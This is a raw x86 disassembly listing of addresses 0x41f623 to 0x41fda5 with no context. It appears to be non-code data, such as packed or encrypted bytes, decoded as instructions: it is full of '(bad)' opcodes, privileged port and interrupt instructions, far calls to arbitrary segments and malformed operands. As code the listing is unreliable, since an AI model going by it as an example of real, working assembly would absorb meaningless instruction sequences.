  41f623:	in     al,dx
  41f624:	mov    ah,0xd5
  41f626:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f627:	sbb    ah,dl
  41f629:	xor    ebx,DWORD PTR [ebx+0x58109978]
  41f62f:	pop    DWORD PTR [edi+0x5a602e2e]
  41f635:	icebp  
  41f636:	jmp    0x69fe2eab
  41f63b:	inc    eax
  41f63c:	stos   DWORD PTR es:[di],eax
  41f63e:	call   0xda08:0x83bb19c4
  41f645:	scas   eax,DWORD PTR es:[edi]
  41f646:	sbb    ecx,DWORD PTR [edx+eax*4]
  41f649:	push   cs
  41f64a:	push   ebx
  41f64b:	adc    BYTE PTR [eax+0x5e],0x51
  41f64f:	pop    edx
  41f650:	pop    edx
  41f651:	(bad)  
  41f653:	push   es
  41f654:	lock or al,bh
  41f657:	cwde   
  41f658:	ja     0x41f6d0
  41f65a:	das    
  41f65b:	mov    ch,0x7d
  41f65d:	cmp    edi,DWORD PTR [ebp+0x10a813d6]
  41f663:	sbb    eax,0x2441a170
  41f668:	xor    ecx,DWORD PTR [ebx]
  41f66a:	aam    0xc3
  41f66c:	call   0xa87b:0x121cfd23
  41f673:	test   eax,0xd881a974
  41f678:	mov    DWORD PTR [eax],esi
  41f67a:	(bad)  
  41f67b:	jmp    0x44dbb026
  41f680:	jmp    0x41f665
  41f682:	inc    esi
  41f683:	sub    BYTE PTR [edx+0x52fe5139],cl
  41f689:	push   eax
  41f68a:	sub    DWORD PTR [ebx],ebx
  41f68c:	outs   dx,DWORD PTR ds:[esi]
  41f68d:	jne    0x41f6ba
  41f68f:	inc    edi
  41f690:	or     eax,0x7ac0f9ac
  41f695:	sbb    eax,0x7ed54966
  41f69a:	cmp    bl,0xb4
  41f69d:	aaa    
  41f69e:	or     BYTE PTR [ebp+0x3ac837e1],bh
  41f6a4:	or     al,BYTE PTR [ecx+0x4a]
  41f6a7:	adc    DWORD PTR [ebx],edi
  41f6a9:	lahf   
  41f6aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f6ab:	push   ebx
  41f6ac:	add    al,0xf
  41f6ae:	ret    
  41f6af:	xor    eax,0x351a363
  41f6b4:	fisttp DWORD PTR [ecx+0x67]
  41f6b7:	fsubr  QWORD PTR [ebx+0xe]
  41f6ba:	pushf  
  41f6bb:	pop    ecx
  41f6bc:	sub    ah,dl
  41f6be:	jp     0x41f739
  41f6c0:	nop
  41f6c1:	dec    esp
  41f6c2:	out    dx,al
  41f6c3:	mov    eax,ds:0x4f31b1a2
  41f6c8:	or     DWORD PTR ds:0x6008eaa8,ebp
  41f6ce:	and    ecx,DWORD PTR [ebp-0x43]
  41f6d1:	addr16 leave 
  41f6d3:	in     eax,dx
  41f6d4:	or     DWORD PTR [eax+0xa],eax
  41f6d7:	int3   
  41f6d8:	je     0x41f6be
  41f6da:	or     bl,BYTE PTR [ebx+0x5cef17f]
  41f6e0:	jp     0x41f717
  41f6e2:	xor    eax,0xa1458050
  41f6e7:	cmp    dl,bh
  41f6e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6ea:	mov    edx,0xe5f9c051
  41f6ef:	add    eax,0xbeeae65e
  41f6f4:	jae    0x41f695
  41f6f6:	adc    DWORD PTR [edi],0xffffff80
  41f6f9:	out    0x34,al
  41f6fb:	add    al,0x1f
  41f6fd:	pop    es
  41f6fe:	inc    ebx
  41f6ff:	pop    edi
  41f700:	jle    0x41f687
  41f702:	cld    
  41f703:	mov    ecx,0xfa0f4882
  41f708:	std    
  41f709:	pusha  
  41f70a:	(bad)  
  41f70b:	icebp  
  41f70c:	loop   0x41f723
  41f70e:	jmp    0x41f6b1
  41f710:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f711:	pop    ds
  41f712:	std    
  41f713:	push   ebp
  41f714:	sbb    ah,BYTE PTR [edi-0x48]
  41f717:	add    al,0x9
  41f719:	fsubp  st(1),st
  41f71b:	sbb    cl,BYTE PTR [ebx+0x29ef8783]
  41f721:	inc    esi
  41f723:	cmp    al,BYTE PTR [ecx+0x26]
  41f726:	outs   dx,BYTE PTR ds:[esi]
  41f727:	sahf   
  41f728:	mov    gs,WORD PTR [edi+0x5ee5ff14]
  41f72e:	in     al,0x9c
  41f730:	push   0x43e9601f
  41f735:	(bad)  
  41f736:	sar    DWORD PTR ds:0x47db6442,cl
  41f73c:	popa   
  41f73d:	xchg   edx,eax
  41f73e:	popa   
  41f73f:	cmp    ecx,DWORD PTR [ebx+edi*4-0x49f59cad]
  41f746:	out    dx,al
  41f747:	(bad)  
  41f749:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f74a:	or     al,0xef
  41f74c:	stos   DWORD PTR es:[edi],eax
  41f74d:	popa   
  41f74e:	ret    
  41f74f:	add    al,0x6
  41f751:	gs or  eax,0x7f5cf751
  41f757:	out    dx,al
  41f758:	sub    al,0x3c
  41f75a:	adc    eax,0xff3ebdd9
  41f75f:	mov    eax,0xe09cefe1
  41f764:	or     al,0x30
  41f766:	lods   al,BYTE PTR ds:[esi]
  41f767:	lea    esp,[eax]
  41f769:	jge    0x41f7e0
  41f76b:	pop    DWORD PTR [edi+0x4e]
  41f76e:	xor    BYTE PTR [edi-0x1f1461d4],bl
  41f774:	inc    ecx
  41f775:	ja     0x41f6fd
  41f777:	int    0x48
  41f779:	stos   DWORD PTR es:[edi],eax
  41f77a:	lock and eax,0x15af4af8
  41f780:	and    DWORD PTR [eax],edx
  41f782:	faddp  st(3),st
  41f784:	mov    eax,ds:0xe2fc9cc2
  41f789:	ds outs dx,BYTE PTR es:[esi]
  41f78c:	pop    edi
  41f78d:	(bad)  
  41f78e:	and    BYTE PTR [eax-0x27],bh
  41f791:	jbe    0x41f772
  41f793:	fld    QWORD PTR [ecx]
  41f795:	iret   
  41f796:	pop    ebp
  41f797:	clc    
  41f798:	inc    ebx
  41f799:	mov    ch,BYTE PTR [edx+0x4d]
  41f79c:	ret    
  41f79d:	ss jmp 0x9480:0x408bcd7a
  41f7a5:	xor    eax,0x16f0eecc
  41f7aa:	and    ebp,DWORD PTR [ecx-0x22]
  41f7ad:	mov    ebp,0x2307d275
  41f7b2:	scas   eax,DWORD PTR es:[edi]
  41f7b3:	ror    BYTE PTR [edi-0x2c],cl
  41f7b6:	xchg   ebp,eax
  41f7b7:	cli    
  41f7b8:	cmp    dl,dh
  41f7ba:	std    
  41f7bb:	pop    ecx
  41f7bc:	sbb    BYTE PTR ds:0x74516f0e,dh
  41f7c2:	mov    DWORD PTR [ecx+ecx*2-0x24],edi
  41f7c6:	mov    ch,0x6c
  41f7c8:	in     al,0x1d
  41f7ca:	adc    dh,BYTE PTR [eax-0x421f0df9]
  41f7d0:	sub    al,0xe4
  41f7d2:	xor    al,0xb3
  41f7d4:	sti    
  41f7d5:	pop    es
  41f7d6:	mov    cl,0x87
  41f7d8:	loope  0x41f83a
  41f7da:	pop    eax
  41f7db:	fbld   TBYTE PTR [edx]
  41f7dd:	ficomp WORD PTR [edx+esi*1+0x4b416108]
  41f7e4:	in     eax,0x3
  41f7e6:	push   eax
  41f7e7:	jle    0x41f77a
  41f7e9:	rcl    DWORD PTR [ecx-0x5e],0x7d
  41f7ed:	dec    esp
  41f7ee:	jp     0x41f7ba
  41f7f0:	push   ebp
  41f7f1:	sti    
  41f7f2:	sbb    eax,DWORD PTR [eax+0x5b]
  41f7f5:	xor    dh,BYTE PTR [esi+edx*2]
  41f7f8:	push   0x44
  41f7fa:	shl    DWORD PTR [ebx-0x6f],0xd4
  41f7fe:	xchg   edx,eax
  41f7ff:	jle    0x41f864
  41f801:	cld    
  41f802:	int    0x3
  41f804:	mov    esp,0x1e0b2fc2
  41f809:	outs   dx,BYTE PTR ds:[esi]
  41f80a:	or     al,0xdb
  41f80c:	jp     0x41f845
  41f80e:	scas   al,BYTE PTR es:[edi]
  41f80f:	fdivr  st,st(5)
  41f811:	mov    ds:0x26142ede,eax
  41f816:	(bad)  
  41f817:	clc    
  41f818:	out    dx,eax
  41f819:	xor    dl,BYTE PTR [ebp+0x43]
  41f81c:	bound  eax,QWORD PTR [ebx-0x136adff0]
  41f822:	hlt    
  41f823:	pop    ss
  41f824:	inc    eax
  41f825:	ds retf 
  41f827:	jl     0x41f865
  41f829:	sub    BYTE PTR [edi],dh
  41f82b:	aad    0xcb
  41f82d:	ret    
  41f82e:	push   esp
  41f82f:	jecxz  0x41f818
  41f831:	pop    esp
  41f832:	xor    eax,0xc942633c
  41f837:	xchg   DWORD PTR [ebp+0x16],edx
  41f83a:	fnstenv [esi-0x28]
  41f83d:	xor    DWORD PTR [esi],ebx
  41f83f:	inc    ebp
  41f840:	pushf  
  41f841:	stos   DWORD PTR es:[edi],eax
  41f842:	imul   esp,DWORD PTR ds:0x6c656d71,0x9
  41f849:	inc    edi
  41f84a:	hlt    
  41f84b:	mov    ?,ebp
  41f84d:	jae    0x41f822
  41f84f:	(bad)  
  41f850:	div    dl
  41f852:	pop    edi
  41f853:	mov    ecx,0xe99b0cea
  41f858:	scas   eax,DWORD PTR es:[edi]
  41f859:	lds    esp,FWORD PTR [esi+0x32]
  41f85c:	or     eax,DWORD PTR [ebx-0x1b]
  41f85f:	call   0xcaf8:0xb84f866c
  41f866:	jno    0x41f7ec
  41f868:	cmp    BYTE PTR [ebp+0x69a1f81c],ah
  41f86e:	inc    eax
  41f86f:	mov    BYTE PTR [edi-0x1ef1dcfc],bl
  41f875:	adc    eax,0x1e601298
  41f87a:	mov    eax,0xae35663d
  41f87f:	in     al,dx
  41f880:	imul   esi,DWORD PTR [ecx-0x7e94fc28],0xddd8d0b9
  41f88a:	sbb    DWORD PTR [ecx-0x584d8bcd],eax
  41f890:	mov    esp,0xf481b20b
  41f895:	inc    esp
  41f896:	jne    0x41f8aa
  41f898:	fadd   QWORD PTR [ebx+0x12375367]
  41f89e:	mov    bh,0xc6
  41f8a0:	scas   al,BYTE PTR es:[edi]
  41f8a1:	dec    edi
  41f8a2:	in     eax,0xdd
  41f8a4:	repnz adc BYTE PTR [ebp-0xfc83360],0x5a
  41f8ac:	or     al,0x6
  41f8ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f8af:	xor    al,0x35
  41f8b1:	sub    bl,BYTE PTR [ecx-0x5c242f68]
  41f8b7:	(bad)  
  41f8b8:	cmp    dl,BYTE PTR [edi+0x4e]
  41f8bb:	sbb    eax,DWORD PTR [ebx+eiz*2+0xd5064e0]
  41f8c2:	pop    ebx
  41f8c3:	cmp    DWORD PTR [ecx+0x60],edx
  41f8c6:	inc    esi
  41f8c7:	push   edi
  41f8c8:	mov    cl,0xf7
  41f8ca:	mov    eax,0x82985660
  41f8cf:	repnz push ecx
  41f8d1:	out    dx,eax
  41f8d2:	lock shl ebx,0x66
  41f8d6:	dec    ebp
  41f8d7:	loop   0x41f8e2
  41f8d9:	sub    BYTE PTR [edi-0xaa8834f],dl
  41f8df:	outs   dx,DWORD PTR ds:[esi]
  41f8e0:	int3   
  41f8e1:	add    bh,ch
  41f8e3:	mov    WORD PTR ds:0xdeb1f491,fs
  41f8e9:	nop
  41f8ea:	shl    BYTE PTR [edx-0x2f8b6112],1
  41f8f0:	cmp    esi,ebx
  41f8f2:	sahf   
  41f8f3:	inc    edx
  41f8f4:	and    DWORD PTR [edx],ecx
  41f8f6:	out    0xe0,al
  41f8f8:	sub    al,0xbd
  41f8fa:	jmp    0x18ee7d8
  41f8ff:	push   0x2875cd1
  41f904:	aad    0xb0
  41f906:	pusha  
  41f907:	cmc    
  41f908:	popa   
  41f909:	in     al,0xc3
  41f90b:	repz fld TBYTE PTR [ebp+0x23]
  41f90f:	dec    esi
  41f910:	mov    ah,0x21
  41f912:	add    BYTE PTR [eax-0x14f202b6],0x1c
  41f919:	aas    
  41f91a:	or     eax,0x271333d6
  41f91f:	iret   
  41f920:	adc    BYTE PTR [ecx],ch
  41f922:	test   DWORD PTR [ecx-0x7164423a],esp
  41f928:	ins    BYTE PTR es:[edi],dx
  41f929:	push   ds
  41f92a:	ffreep st(4)
  41f92c:	ret    0x54e4
  41f92f:	push   eax
  41f930:	inc    BYTE PTR [esi-0x9]
  41f933:	out    dx,eax
  41f934:	cdq    
  41f935:	mov    eax,0x5ed0b88
  41f93a:	jle    0x41f990
  41f93c:	lock jbe 0x41f8c4
  41f93f:	sbb    ah,BYTE PTR [ebx]
  41f941:	jg     0x41f9aa
  41f943:	(bad)  
  41f944:	cmp    DWORD PTR [ebx+0x16],esi
  41f947:	sbb    ebp,edx
  41f949:	jmp    0xb449:0x86df89fe
  41f950:	sbb    eax,edi
  41f952:	add    esi,DWORD PTR [edx-0x2fd3644a]
  41f958:	in     al,0x4e
  41f95a:	or     eax,0x8fe0553a
  41f95f:	int3   
  41f960:	xor    BYTE PTR [edx-0x39aae555],bh
  41f966:	mov    cl,0xad
  41f968:	loop   0x41f9e6
  41f96a:	repz in al,0x15
  41f96d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f96e:	dec    esi
  41f96f:	lods   al,BYTE PTR ds:[esi]
  41f970:	jae    0x41f95d
  41f972:	pop    esi
  41f973:	ins    BYTE PTR es:[edi],dx
  41f974:	dec    edi
  41f975:	icebp  
  41f976:	jbe    0x41f97b
  41f978:	sub    al,0x55
  41f97a:	jno    0x41f970
  41f97c:	cld    
  41f97d:	cdq    
  41f97e:	xchg   edi,eax
  41f97f:	mov    al,0x4a
  41f981:	stos   DWORD PTR es:[edi],eax
  41f982:	xchg   edx,eax
  41f983:	loope  0x41f954
  41f985:	loopne 0x41f9c1
  41f987:	sub    al,BYTE PTR [ebp-0x64969363]
  41f98d:	xchg   BYTE PTR [ebx-0x50],dh
  41f990:	iret   
  41f991:	adc    eax,0x8c9c98b7
  41f996:	cdq    
  41f997:	sub    al,0x17
  41f999:	xchg   edi,eax
  41f99a:	sar    al,0x1
  41f99d:	mov    esp,?
  41f99f:	mov    ebx,edx
  41f9a1:	add    dh,bl
  41f9a3:	mov    esi,0x16cc095c
  41f9a8:	ins    DWORD PTR es:[edi],dx
  41f9a9:	mov    fs,WORD PTR [ebx]
  41f9ab:	xchg   ebx,eax
  41f9ac:	test   al,0xc1
  41f9ae:	ds jmp 0x8ac878af
  41f9b4:	add    ecx,DWORD PTR [bp+di+0x3d]
  41f9b8:	and    al,0x7a
  41f9ba:	daa    
  41f9bb:	push   edx
  41f9bc:	sti    
  41f9bd:	pusha  
  41f9be:	jb     0x41f965
  41f9c0:	cmp    ebx,DWORD PTR [esp+ebx*2]
  41f9c3:	out    0x97,eax
  41f9c5:	or     eax,0xc1c98cab
  41f9ca:	lahf   
  41f9cb:	inc    ecx
  41f9cc:	push   ebp
  41f9cd:	daa    
  41f9ce:	push   0x46
  41f9d0:	cmc    
  41f9d1:	pop    ds
  41f9d2:	xor    BYTE PTR ds:0x248b5241,bl
  41f9d8:	int    0x10
  41f9da:	xchg   esp,eax
  41f9db:	sahf   
  41f9dc:	lahf   
  41f9dd:	pop    edx
  41f9de:	cmp    BYTE PTR [ebx-0x37c4159],ch
  41f9e4:	ins    BYTE PTR es:[edi],dx
  41f9e5:	enter  0xe1da,0xff
  41f9e9:	imul   esp,DWORD PTR [ebx+edx*2+0x2c098f71],0x7a27a3c5
  41f9f4:	or     DWORD PTR [eax],esp
  41f9f6:	fcomp  QWORD PTR [edx-0x31]
  41f9f9:	adc    eax,0x6ce3db44
  41f9fe:	push   0x7e
  41fa00:	pop    edi
  41fa01:	out    0x3c,al
  41fa03:	xor    DWORD PTR [ecx],edi
  41fa05:	ret    0x339
  41fa08:	sub    eax,0xbf34cd18
  41fa0d:	push   eax
  41fa0e:	rcl    BYTE PTR [edi+eiz*4],cl
  41fa11:	lods   al,BYTE PTR ds:[esi]
  41fa12:	retf   
  41fa13:	xor    edx,DWORD PTR [edx+0x4b37c6d1]
  41fa19:	je     0x41fa24
  41fa1b:	iret   
  41fa1c:	lahf   
  41fa1d:	scas   al,BYTE PTR es:[edi]
  41fa1e:	mov    bl,0x4d
  41fa20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa21:	stc    
  41fa22:	inc    edi
  41fa23:	cmp    DWORD PTR [ecx+0x1186a0bc],ebp
  41fa29:	dec    edx
  41fa2a:	loope  0x41f9cb
  41fa2c:	jb     0x41f9f6
  41fa2e:	push   esi
  41fa2f:	cmp    BYTE PTR ss:[esp+esi*1+0x77dd735],ah
  41fa37:	aas    
  41fa38:	xor    DWORD PTR [ecx],edx
  41fa3a:	push   ebx
  41fa3b:	push   ebx
  41fa3c:	add    esi,esp
  41fa3e:	leave  
  41fa3f:	stos   BYTE PTR es:[edi],al
  41fa40:	repnz mov al,0xc7
  41fa43:	inc    esp
  41fa44:	fs push 0x26
  41fa47:	dec    ecx
  41fa48:	hlt    
  41fa49:	sub    al,0x40
  41fa4b:	out    dx,al
  41fa4c:	enter  0x787b,0x9
  41fa50:	mov    ds:0xbc0d68c9,eax
  41fa55:	aad    0x83
  41fa57:	cmp    al,0x38
  41fa59:	adc    BYTE PTR [ecx+ecx*8-0x2],0xb3
  41fa5e:	cld    
  41fa5f:	cmp    esp,DWORD PTR [esi-0x23]
  41fa62:	imul   ecx,DWORD PTR [ebx-0x65],0xa12402fe
  41fa69:	out    0xef,eax
  41fa6b:	stc    
  41fa6c:	xlat   BYTE PTR ds:[ebx]
  41fa6d:	xor    dh,BYTE PTR [ecx+0x7d]
  41fa70:	xchg   eax,ecx
  41fa72:	adc    ebp,edi
  41fa74:	jno    0x41fabc
  41fa76:	dec    eax
  41fa77:	dec    ebp
  41fa78:	retf   
  41fa79:	and    DWORD PTR [edi-0x2d19e99e],0xffffff9e
  41fa80:	or     edx,ecx
  41fa82:	sti    
  41fa83:	push   edx
  41fa84:	(bad)  
  41fa85:	mov    ebx,eax
  41fa87:	mov    ds:0x59385a6c,al
  41fa8c:	cli    
  41fa8d:	rcr    BYTE PTR [esi+0x6eec65ab],0x92
  41fa94:	inc    edi
  41fa95:	loope  0x41fb07
  41fa97:	test   ah,bh
  41fa99:	sub    eax,0x28ee718f
  41fa9e:	inc    edx
  41fa9f:	dec    ecx
  41faa0:	push   0x425eb821
  41faa5:	test   BYTE PTR [eax+edx*4],ch
  41faa8:	sar    BYTE PTR [ecx-0x50],1
  41faab:	cmp    eax,0x1cdd3930
  41fab0:	cli    
  41fab1:	jns    0x41fa4e
  41fab3:	inc    ebx
  41fab4:	ror    BYTE PTR [ecx-0x1c],cl
  41fab7:	push   edi
  41fab8:	or     BYTE PTR [ecx+0x1a95216d],al
  41fabe:	in     al,0x4e
  41fac0:	sub    cl,BYTE PTR [esi-0x39f6bc64]
  41fac6:	data16 or dl,ah
  41fac9:	mov    dh,0xac
  41facb:	sbb    bl,BYTE PTR [esi-0x4aaef337]
  41fad1:	test   eax,0x2ec9ac87
  41fad6:	call   0xe8ae:0xb161007c
  41fadd:	mov    bl,0xbc
  41fadf:	sbb    al,0x29
  41fae1:	mov    esp,0x9318a7a
  41fae6:	pop    esp
  41fae7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fae8:	loopne 0x41faf8
  41faea:	push   ss
  41faeb:	fist   DWORD PTR [ebp-0x1b5e923a]
  41faf1:	shr    dl,0xef
  41faf4:	leave  
  41faf5:	call   FWORD PTR [ecx]
  41faf7:	xor    DWORD PTR [edi-0xed1f98f],eax
  41fafd:	pop    esi
  41fafe:	jns    0x41fa9f
  41fb00:	and    DWORD PTR [ebp-0x60d7d0fc],ecx
  41fb06:	push   ebp
  41fb07:	pop    ecx
  41fb08:	push   edi
  41fb09:	add    al,0x36
  41fb0b:	push   esp
  41fb0c:	aaa    
  41fb0d:	mov    eax,ds:0xe74bcdbb
  41fb12:	js     0x41fa97
  41fb14:	push   ss
  41fb15:	mov    ebx,0x962c2016
  41fb1a:	mov    ebx,0x35f9d036
  41fb1f:	icebp  
  41fb20:	stos   BYTE PTR es:[edi],al
  41fb21:	mov    BYTE PTR [edx+0x45],dl
  41fb24:	js     0x41fad2
  41fb26:	lock push 0x48
  41fb29:	pop    edi
  41fb2a:	dec    edx
  41fb2b:	adc    eax,0x7d876bf0
  41fb30:	inc    edx
  41fb31:	stos   DWORD PTR es:[edi],eax
  41fb32:	xchg   esp,eax
  41fb33:	inc    esp
  41fb34:	mov    esp,0x4b2f1b6f
  41fb39:	mov    edi,DWORD PTR [eax-0x80]
  41fb3c:	mov    BYTE PTR [ebp-0x67],0xbc
  41fb40:	fcomi  st,st(5)
  41fb42:	out    dx,al
  41fb43:	mov    dl,BYTE PTR [eax]
  41fb45:	push   ebx
  41fb46:	popf   
  41fb47:	ins    DWORD PTR es:[edi],dx
  41fb48:	jge    0x41faf0
  41fb4a:	jle    0x41fb9d
  41fb4c:	or     BYTE PTR [esi],0xc6
  41fb4f:	mov    dl,0x27
  41fb51:	xor    al,0x8d
  41fb53:	(bad)  
  41fb54:	jmp    0x41fb2c
  41fb56:	add    ah,BYTE PTR [ecx-0x6e]
  41fb59:	lock cmp eax,0x12e6939e
  41fb5f:	enter  0x637f,0x89
  41fb63:	xchg   ecx,eax
  41fb64:	jp     0x41fb53
  41fb66:	lahf   
  41fb67:	lock xor BYTE PTR [ecx+ebp*1],0x4f
  41fb6c:	adc    edi,DWORD PTR [ebx+edi*8-0x20fd8bb7]
  41fb73:	and    eax,0x40a00b9b
  41fb78:	push   es
  41fb79:	dec    edi
  41fb7a:	mov    al,ds:0x825d4a63
  41fb7f:	idiv   BYTE PTR [ecx+0x1884632d]
  41fb85:	loopne 0x41fb58
  41fb87:	out    0xd6,eax
  41fb89:	ins    DWORD PTR es:[edi],dx
  41fb8a:	in     eax,0x1
  41fb8c:	sbb    DWORD PTR [ecx*8-0x24ca2be6],eax
  41fb93:	cdq    
  41fb94:	mov    BYTE PTR [edi+0x6896f385],bh
  41fb9a:	rol    BYTE PTR [ecx-0x2f],cl
  41fb9d:	push   0xffffffde
  41fb9f:	ds adc eax,0xa6b07afb
  41fba5:	(bad)  
  41fba6:	es pop esi
  41fba8:	popa   
  41fba9:	jg     0x41fbab
  41fbab:	call   0xf3c0:0x4876065
  41fbb2:	fwait
  41fbb3:	mov    dh,0xfa
  41fbb5:	mov    esi,0x98a2587c
  41fbba:	xor    eax,0x5b90ab54
  41fbbf:	nop
  41fbc0:	ins    DWORD PTR es:[edi],dx
  41fbc1:	xor    al,0x2b
  41fbc3:	fistp  QWORD PTR [ecx]
  41fbc5:	sti    
  41fbc6:	imul   edi,DWORD PTR gs:[edx+0x2be10a33],0x70
  41fbce:	inc    esi
  41fbcf:	pop    ecx
  41fbd0:	leave  
  41fbd1:	cwde   
  41fbd2:	fcom   st(3)
  41fbd4:	jb     0x41fc29
  41fbd6:	and    esp,ebp
  41fbd8:	cmp    eax,DWORD PTR [edx+0x56]
  41fbdb:	jp     0x41fc2a
  41fbdd:	add    al,0xab
  41fbdf:	cmp    BYTE PTR [ebx-0x7bc28a94],0xf1
  41fbe6:	retf   0xb803
  41fbe9:	cmp    al,ah
  41fbeb:	outs   dx,DWORD PTR ds:[esi]
  41fbec:	retf   0x112
  41fbef:	push   ebp
  41fbf0:	push   ss
  41fbf1:	ds push ebx
  41fbf3:	test   al,0xbf
  41fbf5:	mov    esi,0x67380948
  41fbfa:	sar    DWORD PTR [ebx+ecx*8-0x73bf4b41],1
  41fc01:	add    esp,DWORD PTR [ecx+0x192e34f3]
  41fc07:	fisttp WORD PTR [edi+0x731158f2]
  41fc0d:	jo     0x41fbee
  41fc0f:	sub    DWORD PTR [edi+ebp*8-0x6843deeb],0x78502012
  41fc1a:	and    ecx,ecx
  41fc1c:	mov    BYTE PTR [edx-0xb],cl
  41fc1f:	mov    ch,0xc5
  41fc21:	jae    0x41fc77
  41fc23:	pusha  
  41fc24:	aam    0x63
  41fc26:	fwait
  41fc27:	cdq    
  41fc28:	and    bh,bl
  41fc2a:	push   ss
  41fc2b:	in     al,dx
  41fc2c:	jp     0x41fbbc
  41fc2e:	mov    edx,0x6444dc9
  41fc33:	dec    edx
  41fc34:	jae    0x41fc98
  41fc36:	cmc    
  41fc37:	and    eax,0xa7647123
  41fc3c:	adc    al,0x63
  41fc3e:	aas    
  41fc3f:	xor    BYTE PTR [edx],ch
  41fc41:	addr16 mov edi,es
  41fc44:	sbb    al,0xc5
  41fc46:	add    ebx,DWORD PTR ds:0x874503c8
  41fc4c:	and    al,0x3e
  41fc4e:	dec    ecx
  41fc4f:	pop    eax
  41fc50:	push   cs
  41fc51:	jmp    0x41fc21
  41fc53:	pop    ss
  41fc54:	xchg   BYTE PTR [eax+0x242cda32],al
  41fc5a:	push   0xffffff93
  41fc5c:	pop    eax
  41fc5d:	push   es
  41fc5e:	mov    dh,0xee
  41fc60:	das    
  41fc61:	or     BYTE PTR [ebx+ebp*1-0x29439f1a],0x20
  41fc69:	add    ah,BYTE PTR [ebp-0x57]
  41fc6c:	repz pop edx
  41fc6e:	retf   
  41fc6f:	test   al,0x5d
  41fc71:	iret   
  41fc72:	inc    ebx
  41fc73:	inc    edx
  41fc74:	out    dx,al
  41fc75:	hlt    
  41fc76:	mov    eax,0x701a5796
  41fc7b:	repnz adc BYTE PTR [esi+eiz*4],0xde
  41fc80:	into   
  41fc81:	sbb    DWORD PTR [esi],ebx
  41fc83:	test   DWORD PTR [ebp+0x2d],eax
  41fc86:	jge    0x41fc94
  41fc88:	sbb    esi,ebp
  41fc8a:	iret   
  41fc8b:	pop    edi
  41fc8c:	push   ebx
  41fc8d:	fimul  WORD PTR [esi]
  41fc8f:	call   0x1c21:0x1c53b315
  41fc96:	xor    DWORD PTR [esi-0x664fe39b],esi
  41fc9c:	sbb    BYTE PTR [esi-0x4a],0x4
  41fca0:	je     0x41fc63
  41fca2:	push   ebx
  41fca3:	xchg   DWORD PTR [ecx],ecx
  41fca5:	and    al,BYTE PTR [ecx+0x39]
  41fca8:	push   es
  41fca9:	adc    bl,BYTE PTR [ebx+0x5a]
  41fcac:	cmp    ebx,DWORD PTR fs:[eax]
  41fcaf:	xchg   esp,eax
  41fcb0:	jge    0x41fd19
  41fcb2:	mov    ds:0xc62d610a,eax
  41fcb7:	sbb    eax,0x998bfb0b
  41fcbc:	jle    0x41fd3a
  41fcbe:	les    esp,FWORD PTR [ecx+0x5e]
  41fcc1:	mov    dh,0xf
  41fcc3:	xchg   esi,eax
  41fcc4:	adc    bh,bh
  41fcc6:	sub    si,WORD PTR [edx-0x23]
  41fcca:	leave  
  41fccb:	ds dec edx
  41fccd:	mov    bh,0x79
  41fccf:	into   
  41fcd0:	push   esp
  41fcd1:	or     BYTE PTR [edi+0x7c5de07],0x83
  41fcd8:	les    esi,FWORD PTR [ebp-0x53]
  41fcdb:	push   ebx
  41fcdc:	call   0xd0c9:0x4b32158b
  41fce3:	xor    eax,0x1fd97898
  41fce8:	loope  0x41fd52
  41fcea:	popf   
  41fceb:	out    0x91,eax
  41fced:	jae    0x41fd63
  41fcef:	xor    eax,0x6de60545
  41fcf4:	nop
  41fcf5:	add    eax,0xea6c05ff
  41fcfa:	cmp    eax,0x6a2c6548
  41fcff:	sbb    al,0xf3
  41fd01:	push   eax
  41fd02:	in     eax,dx
  41fd03:	(bad)  
  41fd04:	dec    esp
  41fd05:	dec    edi
  41fd06:	sbb    al,0xa1
  41fd08:	outs   dx,DWORD PTR ds:[esi]
  41fd09:	mov    ebx,0xdc1cd6da
  41fd0e:	inc    edx
  41fd0f:	call   0x4a6a:0x508398cf
  41fd16:	iret   
  41fd17:	and    esi,DWORD PTR [ecx-0x76db273d]
  41fd1d:	add    DWORD PTR [esi+0x2d69f033],ecx
  41fd23:	mov    BYTE PTR [eax],0xa8
  41fd26:	fld    DWORD PTR [ebp+0x5b]
  41fd29:	pop    esi
  41fd2a:	dec    esp
  41fd2b:	push   ds
  41fd2c:	xor    ah,ch
  41fd2e:	icebp  
  41fd2f:	jns    0x41fda9
  41fd31:	je     0x41fd65
  41fd33:	pop    ecx
  41fd34:	cmp    edx,eax
  41fd36:	and    DWORD PTR ds:[esi],ecx
  41fd39:	push   sp
  41fd3b:	mov    ds:0xa6850a34,eax
  41fd40:	push   ebx
  41fd41:	dec    ebp
  41fd42:	mov    esi,0xac95c176
  41fd47:	loope  0x41fd48
  41fd49:	mov    WORD PTR ds:0xe0c9242b,ds
  41fd4f:	pop    esp
  41fd50:	mov    WORD PTR [edx-0x21],gs
  41fd53:	jb     0x41fdc6
  41fd55:	pop    esp
  41fd56:	sub    BYTE PTR [edx],0xad
  41fd59:	xor    BYTE PTR [esi+0x5c],0x14
  41fd5d:	lahf   
  41fd5e:	jecxz  0x41fce5
  41fd60:	xor    bl,BYTE PTR [edi-0x2fee37f1]
  41fd66:	out    dx,eax
  41fd67:	js     0x41fcfd
  41fd69:	sahf   
  41fd6a:	push   ebp
  41fd6b:	mov    al,ds:0x74d766ec
  41fd70:	out    dx,eax
  41fd71:	or     BYTE PTR [esi+0x26a074fd],ch
  41fd77:	push   edx
  41fd78:	inc    ebp
  41fd79:	cmp    al,0x4e
  41fd7b:	adc    DWORD PTR [eax],0xfffe392b
  41fd81:	xchg   esp,eax
  41fd82:	adc    BYTE PTR [ebp+0x32],bh
  41fd85:	mov    al,0x94
  41fd87:	daa    
  41fd88:	ja     0x41fd25
  41fd8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd8b:	loopne 0x41fdc2
  41fd8d:	lea    esp,[eax+0x522426a5]
  41fd93:	jmp    0x41fd34
  41fd95:	pop    ebp
  41fd96:	sbb    eax,0xbc8c9686
  41fd9b:	call   0xbac9:0xefe04fd5
  41fda2:	mov    dl,0x39
  41fda4:	stos   DWORD PTR es:[edi],eax
  41fda5:	push   es
